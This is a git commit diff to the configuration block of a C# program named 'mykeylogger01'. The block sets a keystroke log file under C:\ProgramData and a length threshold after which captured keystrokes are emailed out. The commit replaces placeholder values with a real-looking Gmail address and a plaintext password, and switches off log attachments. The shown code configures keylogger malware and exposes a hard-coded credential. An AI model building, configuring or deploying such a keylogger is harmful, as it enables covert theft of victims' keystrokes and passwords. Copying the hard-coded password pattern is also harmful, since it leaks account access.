4cfa787e7db0ccc0e9db62fa878146a52b15a51c
Jayesh <144568268+CyberfolioChronicles@users.noreply.github.com>
2023-09-20 13:56:06 +0200

    Update Program.cs

--- mykeylogger01/Program.cs
+++ mykeylogger01/Program.cs
@@ -11,12 +11,12 @@ namespace mykeylogger01
     class Program
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        private const string FROM_EMAIL_ADDRESS = "youremail";
-        private const string FROM_EMAIL_PASSWORD = "yourpassword";
-        private const string TO_EMAIL_ADDRESS = "youremail";
+        private const string FROM_EMAIL_ADDRESS = "testervm404@gmail.com";
+        private const string FROM_EMAIL_PASSWORD = "123456789Abc";
+        private const string TO_EMAIL_ADDRESS = "testervm404@gmail.com";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
-        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
+        private const bool INCLUDE_LOG_AS_ATTACHMENT = false;
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
         private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
         // ----------------------------- END -------------------------------- //
